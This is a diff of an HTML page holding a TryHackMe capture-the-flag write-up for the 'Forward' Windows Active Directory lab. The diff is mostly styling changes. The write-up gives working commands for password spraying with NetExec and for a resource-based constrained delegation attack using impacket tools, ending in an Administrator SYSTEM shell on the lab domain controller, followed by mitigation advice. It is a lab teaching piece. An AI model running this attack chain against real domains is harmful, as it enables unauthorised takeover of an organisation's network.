@@ -4,9 +4,10 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Forward — TryHackMe Writeup | Kun Poonkasetvatana</title>
-  <link rel="stylesheet" href="../style.css?v=4.0"/>
+  <link rel="stylesheet" href="../style.css?v=5.0"/>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700;800&family=Sarabun:wght@300;400;500;600&display=swap" rel="stylesheet"/>
 </head>
 <body class="writeup-page">
 
@@ -14,17 +15,18 @@
   <nav class="navbar">
     <div class="nav-inner">
       <a href="../index.html" class="nav-logo">
-        <span class="logo-accent">&gt;</span> Kun Poonkasetvatana
+        <span class="logo-badge">&gt;</span> Kun Poonkasetvatana
         <span class="logo-handle">(@OfflineDevc)</span>
       </a>
       <div class="nav-links">
-        <a href="../index.html">Home</a>
-        <a href="../index.html#writeups">All Writeups</a>
+        <a href="../index.html" class="nav-link-item">Home</a>
+        <a href="../index.html#writeups" class="nav-link-item active">Writeups</a>
+        <a href="../index.html#about" class="nav-link-item">About</a>
         <div class="nav-social-pills">
-          <a href="https://tryhackme.com/p/Distowel" target="_blank" rel="noopener" class="pill-social thm" title="TryHackMe Profile">THM</a>
-          <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank" rel="noopener" class="pill-social htb" title="HackTheBox Profile">HTB</a>
-          <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank" rel="noopener" class="pill-social in" title="LinkedIn Profile">IN</a>
-          <a href="https://github.com/OfflineDevc" target="_blank" rel="noopener" class="pill-social gh" title="GitHub Profile">GH</a>
+          <a href="https://tryhackme.com/p/Distowel" target="_blank" rel="noopener" class="pill-social" title="TryHackMe Profile">THM</a>
+          <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank" rel="noopener" class="pill-social" title="HackTheBox Profile">HTB</a>
+          <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank" rel="noopener" class="pill-social" title="LinkedIn Profile">IN</a>
+          <a href="https://github.com/OfflineDevc" target="_blank" rel="noopener" class="pill-social" title="GitHub Profile">GH</a>
         </div>
       </div>
     </div>
@@ -35,12 +37,11 @@
     <div class="writeup-hero-inner">
       <div class="hero-top-meta">
         <a href="../index.html#writeups" class="back-link">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-          All Writeups
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+          All Writeups Archive
         </a>
         <div class="author-hero-pill">
-          <span class="author-live-dot"></span>
-          <span>Author: <strong>Kun Poonkasetvatana</strong> (@OfflineDevc)</span>
+          <span>Author: <strong>Kun Poonkasetvatana</strong> (@OfflineDevc) · Published: 09 Nov 2026</span>
         </div>
       </div>
 
@@ -51,7 +52,7 @@
         </div>
         <div class="writeup-badges">
           <span class="badge diff-medium">Medium</span>
-          <span class="badge badge-os os-windows">Windows</span>
+          <span class="badge badge-os">Windows</span>
           <span class="badge badge-platform">TryHackMe</span>
         </div>
       </div>
@@ -64,131 +65,113 @@
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
       <span>Browse All Writeups</span>
     </button>
-    <span class="mobile-current-title">Forward (Windows)</span>
+    <span style="font-size: 13px; font-weight: 500; color: var(--text-secondary);">Forward (Windows)</span>
   </div>
 
   <!-- BACKDROP OVERLAY FOR MOBILE SIDEBAR -->
   <div class="sidebar-overlay" id="sidebarOverlay"></div>
 
-  <!-- MAIN TWO-COLUMN LAYOUT -->
+  <!-- MAIN THREE-COLUMN / TWO-COLUMN LAYOUT -->
   <div class="writeup-layout">
     <aside class="writeup-sidebar" id="sidebar">
-  <div class="sidebar-author-box">
-    <div class="sidebar-author-name">Kun Poonkasetvatana</div>
-    <div class="sidebar-author-meta">
-      <span class="author-badge-tag">@OfflineDevc</span>
-      <span class="author-badge-thm">THM: Distowel</span>
-    </div>
-  </div>
   <div class="sidebar-header">
-    <span class="sidebar-label">WRITEUPS ARCHIVE</span>
-    <span class="sidebar-count">11 ROOMS</span>
+    <span>WRITEUPS ARCHIVE</span>
+    <span>11 ROOMS</span>
   </div>
   <nav class="sidebar-menu">
-    <div class="sidebar-group group-easy">
+    <div class="sidebar-group">
       <div class="sidebar-group-header">
-        <div class="group-left"><span class="diff-indicator dot-easy"></span><span class="sidebar-group-name">EASY</span></div>
-        <span class="sidebar-group-badge pill-easy">1 ROOM</span>
+        <span>EASY</span>
+        <span class="badge diff-easy">1 ROOM</span>
       </div>
       <ul class="sidebar-list">
         <li class="sidebar-item">
-          <a href="skynet.html" class="sidebar-link" title="Skynet">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Skynet</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="skynet.html" title="Skynet">
+            <span>Skynet</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
       </ul>
     </div>
-    <div class="sidebar-group group-medium">
+    <div class="sidebar-group">
       <div class="sidebar-group-header">
-        <div class="group-left"><span class="diff-indicator dot-medium"></span><span class="sidebar-group-name">MEDIUM</span></div>
-        <span class="sidebar-group-badge pill-medium">6 ROOMS</span>
+        <span>MEDIUM</span>
+        <span class="badge diff-medium">6 ROOMS</span>
       </div>
       <ul class="sidebar-list">
         <li class="sidebar-item">
-          <a href="deaddrop.html" class="sidebar-link" title="Deaddrop">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Deaddrop</span>
-            <span class="sidebar-os-badge os-ad">Linux / AD</span>
+          <a href="deaddrop.html" title="Deaddrop">
+            <span>Deaddrop</span>
+            <span class="sidebar-os-badge">Linux / AD</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="domino.html" class="sidebar-link" title="Domino">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Domino</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="domino.html" title="Domino">
+            <span>Domino</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item active">
-          <a href="forward.html" class="sidebar-link" title="Forward">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Forward</span>
-            <span class="sidebar-os-badge os-windows">Windows</span>
+          <a href="forward.html" title="Forward">
+            <span>Forward</span>
+            <span class="sidebar-os-badge">Windows</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="mrrobotctf.html" class="sidebar-link" title="Mr. Robot CTF">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Mr. Robot CTF</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="mrrobotctf.html" title="Mr. Robot CTF">
+            <span>Mr. Robot CTF</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="relevant.html" class="sidebar-link" title="Relevant">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Relevant</span>
-            <span class="sidebar-os-badge os-windows">Windows</span>
+          <a href="relevant.html" title="Relevant">
+            <span>Relevant</span>
+            <span class="sidebar-os-badge">Windows</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="silent-monitor.html" class="sidebar-link" title="Silent Monitor">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Silent Monitor</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="silent-monitor.html" title="Silent Monitor">
+            <span>Silent Monitor</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
       </ul>
     </div>
-    <div class="sidebar-group group-hard">
+    <div class="sidebar-group">
       <div class="sidebar-group-header">
-        <div class="group-left"><span class="diff-indicator dot-hard"></span><span class="sidebar-group-name">HARD</span></div>
-        <span class="sidebar-group-badge pill-hard">4 ROOMS</span>
+        <span>HARD</span>
+        <span class="badge diff-hard">4 ROOMS</span>
       </div>
       <ul class="sidebar-list">
         <li class="sidebar-item">
-          <a href="brainpan1.html" class="sidebar-link" title="Brainpan 1">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Brainpan 1</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="brainpan1.html" title="Brainpan 1">
+            <span>Brainpan 1</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="daily-bugle.html" class="sidebar-link" title="Daily Bugle">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Daily Bugle</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="daily-bugle.html" title="Daily Bugle">
+            <span>Daily Bugle</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="internal.html" class="sidebar-link" title="Internal">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Internal</span>
-            <span class="sidebar-os-badge os-linux">Linux</span>
+          <a href="internal.html" title="Internal">
+            <span>Internal</span>
+            <span class="sidebar-os-badge">Linux</span>
           </a>
         </li>
         <li class="sidebar-item">
-          <a href="retro.html" class="sidebar-link" title="Retro">
-            <span class="sidebar-item-bullet"></span>
-            <span class="sidebar-item-title">Retro</span>
-            <span class="sidebar-os-badge os-windows">Windows</span>
+          <a href="retro.html" title="Retro">
+            <span>Retro</span>
+            <span class="sidebar-os-badge">Windows</span>
           </a>
         </li>
       </ul>
     </div>
   </nav>
-  <div class="sidebar-footer">
-    <a href="../index.html#writeups" class="sidebar-home-link">
+  <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid var(--border-light);">
+    <a href="../index.html#writeups" class="back-link">
       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
       <span>Back to Portfolio Grid</span>
     </a>
@@ -197,7 +180,7 @@
 
     <main class="writeup-main">
       <article class="writeup-content">
-<h2>1. Executive Summary &amp; Machine Overview</h2>
+<h2 id="1-executive-summary-amp-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
 <table>
 <thead>
 <tr>
@@ -237,7 +220,7 @@
 </tbody>
 </table>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114162634.png" /></p>
-<h3>Attack Chain Summary</h3>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
 <ol>
 <li><strong>Reconnaissance &amp; BloodHound</strong>:<br />
    - <code>nmap -sV -sC 10.48.167.228 -Pn</code> identified Active Directory domain services on <code>DC01.ctf.local</code>.<br />
@@ -257,8 +240,8 @@
    - Read flag: <code>type flag.txt</code> ➔ <code>THM{********************************}</code>.</li>
 </ol>
 <hr />
-<h2>2. Phase 1: Reconnaissance &amp; BloodHound Enumeration</h2>
-<h3>2.1 Port Scanning (Nmap)</h3>
+<h2 id="2-phase-1-reconnaissance-amp-bloodhound-enumeration">2. Phase 1: Reconnaissance &amp; BloodHound Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
 <p>We scan the Domain Controller <code>10.48.167.228</code>:</p>
 <pre><code class="language-bash">nmap -sV -sC 10.48.167.228 -Pn
 </code></pre>
@@ -273,7 +256,7 @@
 - Domain Name: <code>ctf.local</code>, Computer Name: <code>DC01</code></p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114151354.png" /><br />
 <img alt="screenshot" src="../images/Pasted%20image%2020261114151735.png" /></p>
-<h3>2.2 BloodHound Graph Analysis</h3>
+<h3 id="22-bloodhound-graph-analysis">2.2 BloodHound Graph Analysis</h3>
 <p>We import domain data into BloodHound to map relationship paths:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114160306.png" /><br />
 <img alt="screenshot" src="../images/Pasted%20image%2020261114152416.png" /><br />
@@ -284,14 +267,14 @@
 - <strong><code>svc.helpdesk</code></strong><br />
 - <strong><code>r.williams</code></strong></p>
 <hr />
-<h2>3. Phase 2: Credential Harvesting &amp; Password Spraying</h2>
-<h3>3.1 Kerberoasting Attempt (<code>svc.helpdesk</code>)</h3>
+<h2 id="3-phase-2-credential-harvesting-amp-password-spraying">3. Phase 2: Credential Harvesting &amp; Password Spraying</h2>
+<h3 id="31-kerberoasting-attempt-svchelpdesk">3.1 Kerberoasting Attempt (<code>svc.helpdesk</code>)</h3>
 <p>We request Kerberos TGS tickets for SPNs in the domain:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114153638.png" /></p>
 <p>We attempt cracking the ticket for <code>svc.helpdesk</code> using Hashcat mode 13100:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114154751.png" /></p>
 <p>The ticket for <code>svc.helpdesk</code> did not crack, so we move forward with alternative credential sources.</p>
-<h3>3.2 Pivoting via RDP (<code>j.smith</code>)</h3>
+<h3 id="32-pivoting-via-rdp-jsmith">3.2 Pivoting via RDP (<code>j.smith</code>)</h3>
 <p>We connect via RDP using existing credentials for <code>j.smith</code>:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114155730.png" /><br />
 <img alt="screenshot" src="../images/Pasted%20image%2020261114155751.png" /><br />
@@ -299,7 +282,7 @@
 <p>Inside the session, we discover stored credentials:<br />
 - <strong>Username</strong>: <code>t.jones</code><br />
 - <strong>Password</strong>: <code>********</code></p>
-<h3>3.3 Password Spraying via NetExec</h3>
+<h3 id="33-password-spraying-via-netexec">3.3 Password Spraying via NetExec</h3>
 <p>We test the recovered password <code>********</code> across the userlist:</p>
 <pre><code class="language-bash">nxc smb DC01.ctf.local -u user.txt -p '********' --continue-on-success
 </code></pre>
@@ -310,11 +293,11 @@ SMB  10.48.167.228  445  DC01  [-] ctf.local\svc.helpdesk:******** STATUS_LOGON_
 </code></pre>
 <p>User <strong><code>r.williams</code></strong> is successfully compromised!</p>
 <hr />
-<h2>4. Phase 3: Privilege Escalation via RBCD (Resource-Based Constrained Delegation)</h2>
-<h3>4.1 Vulnerability Identification</h3>
+<h2 id="4-phase-3-privilege-escalation-via-rbcd-resource-based-constrained-delegation">4. Phase 3: Privilege Escalation via RBCD (Resource-Based Constrained Delegation)</h2>
+<h3 id="41-vulnerability-identification">4.1 Vulnerability Identification</h3>
 <p>In BloodHound, <code>r.williams</code> has <strong><code>AddAllowedToAct</code></strong> privileges over <code>DC01.CTF.LOCAL</code>:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114161356.png" /></p>
-<h3>4.2 Step 1: Adding a Machine Account (<code>ATTACKER$</code>)</h3>
+<h3 id="42-step-1-adding-a-machine-account-attacker">4.2 Step 1: Adding a Machine Account (<code>ATTACKER$</code>)</h3>
 <p>Using <code>impacket-addcomputer</code> with SAMR protocol:</p>
 <pre><code class="language-bash">impacket-addcomputer -method SAMR \
   -computer-name 'ATTACKER$' \
@@ -325,7 +308,7 @@ SMB  10.48.167.228  445  DC01  [-] ctf.local\svc.helpdesk:******** STATUS_LOGON_
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114161849.png" /></p>
 <pre><code class="language-text">[*] Successfully added machine account ATTACKER$ with password ********.
 </code></pre>
-<h3>4.3 Step 2: Configuring RBCD on <code>DC01</code></h3>
+<h3 id="43-step-2-configuring-rbcd-on-dc01">4.3 Step 2: Configuring RBCD on <code>DC01</code></h3>
 <p>We write <code>ATTACKER$</code> into the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of <code>DC01$</code>:</p>
 <pre><code class="language-bash">impacket-rbcd -delegate-from 'ATTACKER$' \
   -delegate-to 'DC01$' \
@@ -343,7 +326,7 @@ SMB  10.48.167.228  445  DC01  [-] ctf.local\svc.helpdesk:******** STATUS_LOGON_
   -dc-ip 10.48.167.228 'ctf.local/r.williams:********'
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261114161944.png" /></p>
-<h3>4.4 Step 3: Requesting Service Ticket via S4U2Proxy</h3>
+<h3 id="44-step-3-requesting-service-ticket-via-s4u2proxy">4.4 Step 3: Requesting Service Ticket via S4U2Proxy</h3>
 <p>We request a Kerberos service ticket for <code>cifs/DC01.ctf.local</code> impersonating <code>Administrator</code>:</p>
 <pre><code class="language-bash">impacket-getST 'ctf.local/ATTACKER$:P@ssw0rd123!' \
   -spn 'cifs/DC01.ctf.local' \
@@ -357,7 +340,7 @@ SMB  10.48.167.228  445  DC01  [-] ctf.local\svc.helpdesk:******** STATUS_LOGON_
 [*] Requesting S4U2Proxy
 [*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
 </code></pre>
-<h3>4.5 Step 4: Gaining SYSTEM Shell &amp; Flag Retrieval</h3>
+<h3 id="45-step-4-gaining-system-shell-amp-flag-retrieval">4.5 Step 4: Gaining SYSTEM Shell &amp; Flag Retrieval</h3>
 <p>We set the Kerberos cache environment variable and execute <code>impacket-psexec</code>:</p>
 <pre><code class="language-bash">export KRB5CCNAME=./Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
 impacket-psexec -k -no-pass DC01.ctf.local
@@ -383,7 +366,7 @@ THM{********************************}
 <li><strong>Flag Captured</strong>: <code>THM{********************************}</code></li>
 </ul>
 <hr />
-<h2>5. Security Mitigations &amp; Remediation</h2>
+<h2 id="5-security-mitigations-amp-remediation">5. Security Mitigations &amp; Remediation</h2>
 <table>
 <thead>
 <tr>
@@ -411,7 +394,7 @@ THM{********************************}
 </tbody>
 </table>
 <hr />
-<h2>6. Tools Used</h2>
+<h2 id="6-tools-used">6. Tools Used</h2>
 <ul>
 <li><strong>Nmap</strong>: Port scanning (<code>nmap -sV -sC 10.48.167.228 -Pn</code>)</li>
 <li><strong>BloodHound</strong>: Active Directory graph analysis</li>
@@ -424,38 +407,61 @@ THM{********************************}
       <!-- PREV / NEXT NAVIGATION -->
       
     <nav class="writeup-pagination">
-      <a href="domino.html" class="pagination-card prev-card">
+      <a href="domino.html" class="pagination-card">
         <span class="pagination-sub">← PREVIOUS WRITEUP</span>
         <span class="pagination-title">Domino</span>
         <div class="pagination-badges-row">
-          <span class="pagination-badge diff-medium">Medium</span>
-          <span class="pagination-badge badge-os">Linux</span>
+          <span class="pagination-badge">Medium</span>
+          <span class="pagination-badge">Linux</span>
         </div>
       </a>
-      <a href="mrrobotctf.html" class="pagination-card next-card">
+      <a href="mrrobotctf.html" class="pagination-card" style="text-align: right;">
         <span class="pagination-sub">NEXT WRITEUP →</span>
         <span class="pagination-title">Mr. Robot CTF</span>
-        <div class="pagination-badges-row">
-          <span class="pagination-badge diff-medium">Medium</span>
-          <span class="pagination-badge badge-os">Linux</span>
+        <div class="pagination-badges-row" style="justify-content: flex-end;">
+          <span class="pagination-badge">Medium</span>
+          <span class="pagination-badge">Linux</span>
         </div>
       </a>
     </nav>
     
     </main>
+
+    <aside class="toc-sidebar">
+  <div class="toc-title">ON THIS PAGE</div>
+  <ul class="toc-menu">
+    <li><a href="#1-executive-summary-amp-machine-overview" class="toc-link">1. Executive Summary &amp; Machine Overview</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#attack-chain-summary" class="toc-link">Attack Chain Summary</a></li>
+    <li><a href="#2-phase-1-reconnaissance-amp-bloodhound-enumeration" class="toc-link">2. Phase 1: Reconnaissance &amp; BloodHound Enumeration</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#21-port-scanning-nmap" class="toc-link">2.1 Port Scanning (Nmap)</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#22-bloodhound-graph-analysis" class="toc-link">2.2 BloodHound Graph Analysis</a></li>
+    <li><a href="#3-phase-2-credential-harvesting-amp-password-spraying" class="toc-link">3. Phase 2: Credential Harvesting &amp; Password Spraying</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#31-kerberoasting-attempt-svchelpdesk" class="toc-link">3.1 Kerberoasting Attempt (svc.helpdesk)</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#32-pivoting-via-rdp-jsmith" class="toc-link">3.2 Pivoting via RDP (j.smith)</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#33-password-spraying-via-netexec" class="toc-link">3.3 Password Spraying via NetExec</a></li>
+    <li><a href="#4-phase-3-privilege-escalation-via-rbcd-resource-based-constrained-delegation" class="toc-link">4. Phase 3: Privilege Escalation via RBCD (Resource-Based Constrained Delegation)</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#41-vulnerability-identification" class="toc-link">4.1 Vulnerability Identification</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#42-step-1-adding-a-machine-account-attacker" class="toc-link">4.2 Step 1: Adding a Machine Account (ATTACKER$)</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#43-step-2-configuring-rbcd-on-dc01" class="toc-link">4.3 Step 2: Configuring RBCD on DC01</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#44-step-3-requesting-service-ticket-via-s4u2proxy" class="toc-link">4.4 Step 3: Requesting Service Ticket via S4U2Proxy</a></li>
+    <li style="padding-left: 12px; font-size: 12.5px;"><a href="#45-step-4-gaining-system-shell-amp-flag-retrieval" class="toc-link">4.5 Step 4: Gaining SYSTEM Shell &amp; Flag Retrieval</a></li>
+    <li><a href="#5-security-mitigations-amp-remediation" class="toc-link">5. Security Mitigations &amp; Remediation</a></li>
+    <li><a href="#6-tools-used" class="toc-link">6. Tools Used</a></li>
+  </ul>
+</aside>
   </div>
 
   <!-- FOOTER -->
   <footer class="footer">
     <div class="footer-inner">
-      <p class="footer-author">Security Portfolio of <strong>Kun Poonkasetvatana</strong> (@OfflineDevc)</p>
-      <p class="footer-copy">Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+      <p style="font-weight: 600; color: var(--text-main); margin-bottom: 6px;">Security Research &amp; Writeups Archive</p>
+      <p class="footer-copy">Built with classic minimalist design by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
          <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
          <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a> · 
          <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
     </div>
   </footer>
 
-  <script src="../script.js?v=4.0"></script>
+  <script src="../script.js?v=5.0"></script>
 </body>
 </html>
